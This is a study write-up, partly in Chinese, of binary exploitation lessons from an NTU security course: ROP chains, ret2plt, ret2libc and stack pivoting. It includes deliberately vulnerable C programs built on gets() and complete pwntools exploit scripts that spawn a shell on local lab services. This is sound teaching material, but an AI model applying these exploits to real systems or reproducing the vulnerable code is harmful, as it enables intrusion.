---
title: Yuawn Binary exploitation WriteUp
date: 2024-08-05 13:50:20
category: PWN
tags: pwn
---

## ROP

> Return Oriented Programming
>From `yuawn` [NTU-Computer-Security](https://github.com/yuawn/NTU-Computer-Security)

- [x] week1
- [x] week2
- [ ] week3
- [ ] PicoCTF.com
- [ ] [pwn.college](https://pwn.college/)
- [ ] Pwnable.tw



## pwntools interact with gdb

- tmux
- `pause()` ,  gdb `attach pid` 


## ROP Gadgets

> [ROP Gadgets](https://tech-blog.cymetrics.io/posts/crystal/pwn-intro-2/)

### Tools

+ [ROPgadget](https://github.com/JonathanSalwan/ROPgadget)
+ [Ropper](https://github.com/sashs/Ropper)

> base on [capstone](https://github.com/capstone-engine/capstone)

### ROP
>For **NX** 

+ 在 **code segment** 尋找 gadgets 叠成一串 return address chain (**ROP chain**)
+ 透過gadgets串出代碼執行，繞過 NX 
+ 首先，將函數返回地址彈出，將`rsp`指向第二個 Return address 並跳轉至執行第一個 Return address。接著執行 **ret** instruction，並在一開始放置好第二個 return address，從而實現持續 control flow。通過反覆執行此操作，達到 Return Oriented Programming attack 的目的。

### Control register

`Gadget - pop <reg>; ret;`

> Gadget 來源
>> 不只有完整instruction可以形成Gadget，只要跳的位置合適，可能連value也可以被解析成可執行的Gadget

- 用ROP chain出 syscall

![截圖 2024-07-14 22.53.56](https://hackmd.io/_uploads/Skzc8vZuC.png )

![image](https://hackmd.io/_uploads/r1J3iQmCT.png )
+ `ox601000` input in rdi
+ `'/bin/sh\0'` input in rsi
+ `mov qword ptr [rdi], rsi` mov rsi to **rdi pointer** memory space
...

### 總結

+ Overflow control rip 後
+ **NX Off** 的前提下可撰寫shellcode `execve("/bin/sh",0,0)`直接執行
+ **NX On** 時透過 ROP 推疊出執行 `execve("/bin/sh",0,0)` 行為的 ROP chain


```c
attack = !NX ? shellcode : ROP
```

### DEMO

> rop.c
```cpp
#include<stdio.h>
#include<stdlib.h>

void init(){
    setvbuf(stdout,0,2,0);
    setvbuf(stdin,0,2,0);
    setvbuf(stderr,0,2,0);
}

int main(){

    init();

    puts( "Say hello to stack :D" );

    char buf[0x30];
    gets( buf );

    return 0;
}
```
> Compile
>>`gcc src/rop.c -o ./rop/share/rop -no-pie -fno-stack-protector --static`
>>`--static`: 方便練習
    
#### 解法

1. `ROPgadgget --binary ./rop` ,找出你要的 gadget
2. `gdb vmmap` 找可寫位置
3.  - `pop rax;0x3b;syscall;`  : `sys_execve(%rdi,%rsi,%rdx)`
4.  - %rdx : 0
    - %rdi : `bss` , pointer to memory space
    - %rsi : `mov [rdi], rsi` ; "/bin/sh\0", 0
    

```python
#!/usr/bin/env python
from pwn import *

context.arch = 'amd64'

y = remote( 'localhost' , 10173 )
#y = process( '../rop/share/rop' )
#pause()


pop_rax = 0x0000000000415714
pop_rdi = 0x0000000000400686
pop_rsi = 0x00000000004100f3
pop_rdx = 0x0000000000449935
mov_q_rdi_rsi = 0x000000000044709b # mov qword ptr [rdi], rsi ; ret
syscall = 0x000000000047b68f

pop_rdx_rsi = 0x000000000044beb9

bss = 0x6b6030

p = flat(
    'a' * 0x38,
    pop_rdi,
    bss,
    pop_rsi,
    '/bin/sh\0',
    mov_q_rdi_rsi,
    pop_rsi,
    0,
    pop_rdx,
    0,
    pop_rax,
    0x3b,
    syscall
)

y.sendlineafter( ':D' , p )

y.sendline( 'cat /home/`whoami`/flag' )

y.interactive()
```

## ret2plt

> Return to .plt

![截圖 2024-07-15 00.04.25](https://hackmd.io/_uploads/rJ5GPOWd0.png)

> 找到plt function 的位置就可以直接call

![截圖 2024-07-15 15.53.23](https://hackmd.io/_uploads/BJbFSUMOA.png)

 - 可以直接取代rop chain(👆) 的一長串
![截圖 2024-07-15 15.54.24](https://hackmd.io/_uploads/Sy2nrIGOR.png)
- system
![截圖 2024-07-15 18.08.18](https://hackmd.io/_uploads/rkk7HOGdC.png)

<br>

### DEMO

```c=
#include<stdio.h>
#include<stdlib.h>

void init(){
    setvbuf(stdout,0,2,0);
    setvbuf(stdin,0,2,0);
    setvbuf(stderr,0,2,0);
}

int main(){

    init();

    system( "echo 'Say hello to stack :D'" );

    char buf[0x30];
    gets( buf );

    return 0;
}
```

#### Sol

```python=
#!/usr/bin/env python
from pwn import *

context.arch = 'amd64'

y = remote( 'localhost' , 10174 )
#y = process( '../ret2plt/share/ret2plt' )
#pause()

pop_rdi = 0x0000000000400733

gets_plt = 0x400530
system_plt = 0x400520
bss = 0x601070

p = flat(
    'a' * 0x38,
    pop_rdi,
    bss,
    gets_plt,
    pop_rdi,
    bss,
    system_plt
)

y.sendlineafter( ':D' , p )

y.sendline( 'sh' )

y.sendline( 'cat /home/`whoami`/flag' )

y.interactive()
```

### Conculsion

In the condition that without pie , cross ASLR to use lib function.

## ret2libc

> Bypass ASLR - 能leak就結束了

- Function .got table -> **lib address**
- `leaked_address - offset = base_address`

![截圖 2024-07-15 22.31.08](https://hackmd.io/_uploads/ry_2G3fdR.png)


### Demo

- 再一次的連線中，需要同時leak和expolit
- `objdump -R <binary>` : 找 libc_start_main
- `readelf -s <binary>` : 找 offset
- leak 完成，跳回main再出發 overflow
- 可以從binary中搜尋`"/bin/sh"` : `print '"/bin/sh" str :' , hex( l.search( '/bin/sh' ).next() )`
- 可能會crash，因為需要8bytes對齊：再加上ret就可解決


#### "/bin/sh" 的寫入

1. 使用ret2plt call `gets()` 寫入
2. pwntools lib.search

## information leaking

- array 寫出一個區域並不會把內容清掉
- 使用leak_address和offset就可以知道 base_address

### stack pivoting

> stack migartion

- leave ; ret
    - Overflow 時將 **rbp** 填成 ROP Chain 的 `address -8`
    - return address th leave; ret gadget
    - pop rsp; ret
    - 手動找針對各種當下情況的 gadget